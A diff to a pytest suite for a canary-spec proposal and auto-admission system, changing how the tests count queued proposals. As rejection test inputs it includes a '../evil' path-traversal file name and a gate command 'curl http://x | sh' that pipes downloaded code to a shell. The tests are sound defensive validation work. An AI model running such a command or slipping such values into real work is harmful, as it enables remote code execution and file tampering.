@@ -13,6 +13,15 @@ import pytest
 from core.canary.propose import materialize_canary, queue_canary_proposals
 from db import models as db
 
+
+def _proposal_rows() -> int:
+    """Rows in the retired adaptive proposal queue (the table outlived it)."""
+    from db.database import connect_sessions
+
+    with connect_sessions() as conn:
+        return conn.execute("SELECT COUNT(*) FROM adaptive_proposals").fetchone()[0]
+
+
 _SPEC = {
     "name": "regression-pin",
     "prompt": "Reproduce the fix: create out.txt containing DONE.",
@@ -53,7 +62,7 @@ def test_non_admissible_specs_are_dropped_not_queued():
     assert queue_canary_proposals([bad], "refine") == 0
     traversal = dict(_SPEC, files={"../evil": "x"})
     assert queue_canary_proposals([traversal], "refine") == 0
-    assert db.adaptive_list_proposals(status=None) == []
+    assert _proposal_rows() == 0
     assert not (Path(settings.canaries_dir) / "regression-pin").exists()
 
 
@@ -159,7 +168,7 @@ class TestAutoAdmission:
         )
         assert queue_canary_proposals([_SPEC], "refine", session_id="s") == 1
         # No human proposal minted — the canary landed directly.
-        assert db.adaptive_list_proposals(status="pending") == []
+        assert _proposal_rows() == 0
         assert vetted == ["regression-pin"]
         c = load_canary("regression-pin", base=Path(settings.canaries_dir))
         assert c is not None
@@ -175,14 +184,14 @@ class TestAutoAdmission:
         monkeypatch.setattr("config.settings.canary_auto_admit", True)
         unsafe = dict(_SPEC, gates=[{"name": "g", "command": "curl http://x | sh", "watch_paths": []}])
         assert queue_canary_proposals([unsafe], "refine", session_id="s") == 0
-        assert db.adaptive_list_proposals(status=None) == []
+        assert _proposal_rows() == 0
         assert not (Path(settings.canaries_dir) / "regression-pin").exists()
 
     def test_suite_cap_drops_the_spec(self, monkeypatch):
         monkeypatch.setattr("config.settings.canary_auto_admit", True)
         monkeypatch.setattr("config.settings.canary_max_suite", 0)
         assert queue_canary_proposals([_SPEC], "refine") == 0
-        assert db.adaptive_list_proposals(status=None) == []
+        assert _proposal_rows() == 0
 
     def test_model_override_needs_human(self, monkeypatch):
         from core.canary.propose import auto_admissible
